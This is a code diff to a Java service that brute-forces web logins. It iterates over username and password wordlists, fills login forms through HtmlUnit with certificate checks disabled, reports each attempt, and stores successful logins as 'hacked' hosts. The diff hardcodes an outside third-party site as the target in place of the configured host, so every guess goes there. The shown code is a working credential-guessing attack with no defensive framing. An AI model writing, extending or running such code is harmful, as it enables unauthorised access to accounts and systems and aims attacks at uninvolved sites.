@@ -116,56 +116,28 @@ public class ConnectionService implements IConnectionService {
 		Integer port = host.getPort();
 
 		if (running.compareAndSet(false, true)) {
-			for (String user : userWordlist) {
-				for (String pass : passWordlist) {
-					if (Thread.currentThread().isInterrupted()) {
-						System.out.println("Interrupted");
-						running.set(false);
-						return new AsyncResult<String>(finalResult);
-					}
-					// URL hostUrl;
-					// try {
-					// hostUrl = new URL("http://" + host.getIp() + ":"
-					// + host.getPort());
-					// URLConnection connection = hostUrl.openConnection();
-					//
-					// String userPass = user + ":" + pass;
-					// String authStr = Base64.getEncoder()
-					// .encodeToString(userPass.getBytes());
-					// // setting Authorization header
-					// connection.setRequestProperty("Authorization",
-					// "Basic " + authStr);
-					//
-					// Map<String, List<String>> headersMap = connection
-					// .getHeaderFields();
-					// System.out.println("-- Response headers --");
-					// headersMap.entrySet().forEach(e -> System.out
-					// .printf("%s: %s%n", e.getKey(), e.getValue()));
-					// System.out.println("-- Response body --");
-					// try (BufferedReader reader = new BufferedReader(
-					// new InputStreamReader(
-					// connection.getInputStream()))) {
-					// reader.lines().forEach(System.out::println);
-					// }
-					// } catch (MalformedURLException e) {
-					// LOGGER.error(e.getMessage(), e);
-					// } catch (IOException e) {
-					// LOGGER.error(e.getMessage(), e);
-					// }
-					System.out.println("Credentials tested --> User: " + user
-							+ " | Password: " + pass);
-					messageController.send("Credentials tested --> User: "
-							+ user + " | Password: " + pass);
-					try (final WebClient webClient = new WebClient()) {
-						String protocol = "http://";
-						if (host.getPort() == 443) {
-							protocol = "https://";
+			final WebClient webClient = new WebClient();
+			String protocol = "http://";
+			if (host.getPort() == 443) {
+				protocol = "https://";
+			}
+			webClient.getOptions().setUseInsecureSSL(true);
+			HtmlPage page;
+
+			try {
+
+				for (String user : userWordlist) {
+					for (String pass : passWordlist) {
+						if (Thread.currentThread().isInterrupted()) {
+							System.out.println("Interrupted");
+							running.set(false);
+							return new AsyncResult<String>(finalResult);
 						}
-						webClient.getOptions().setUseInsecureSSL(true);
-						final HtmlPage page = webClient.getPage(
-								protocol + host.getIp() + ":" + host.getPort());
-						// final HtmlPage page = webClient.getPage(
-						// "http://" + "192.168.1.1" + ":" + "80");
+
+						// page = webClient.getPage(
+						// protocol + host.getIp() + ":" + host.getPort());
+						page = webClient
+								.getPage("https://newserv.freewha.com/");
 
 						final HtmlForm form = page.getForms().get(0);
 
@@ -174,25 +146,36 @@ public class ConnectionService implements IConnectionService {
 								.get(0);
 						final HtmlTextInput userField = (HtmlTextInput) form
 								.getByXPath(
-										"//input[contains(@name, 'user') or contains(@name, 'username')]")
+										"//input[contains(@name, 'user') or contains(@name, 'username') or contains(@name, 'userName') or contains(@name, 'login')]")
 								.get(0);
 						final HtmlPasswordInput passField = (HtmlPasswordInput) form
 								.getByXPath(
 										"//input[contains(@type, 'password')]")
 								.get(0);
+
+						System.out.println("Credentials tested --> User: "
+								+ user + " | Password: " + pass);
+						messageController.send("Credentials tested --> User: "
+								+ user + " | Password: " + pass);
+
 						userField.type(user);
 						passField.type(pass);
 
 						// Now submit the form by clicking the button and get
 						// back the second page.
 						final HtmlPage page2 = button.click();
-						if (!page2.getUrl().equals(page.getUrl())) {
+						// Get new form, if exists
+						if (page2.getForms().isEmpty() || page2.getForms()
+								.get(0)
+								.getByXPath(
+										"//input[contains(@type, 'password')]")
+								.isEmpty()) {
 							result = "Correct login credentials --> User: "
 									+ user + " | Password: " + pass;
 							System.out.println(result);
 							messageController.send(result);
 							finalResult = ip + "|" + user + "|" + pass + "|"
-									+ 22;
+									+ port;
 							HackedHost hackedHost = hackedHostRepository
 									.findByIpAndPort(ip, host.getPort());
 							if (hackedHost == null) {
@@ -213,13 +196,16 @@ public class ConnectionService implements IConnectionService {
 							messageController
 									.send("Incorrect login credentials");
 						}
-					} catch (FailingHttpStatusCodeException | IOException e) {
-						LOGGER.error(e.getMessage(), e);
 					}
 				}
+			} catch (FailingHttpStatusCodeException | IOException e) {
+				LOGGER.error(e.getMessage(), e);
 			}
 		}
-
+		System.out.println(
+				"Login attempts for IP " + ip + " were not successfull");
+		messageController
+				.send("Login attempts for IP " + ip + " were not successfull");
 		return new AsyncResult<String>(finalResult);
 
 	}
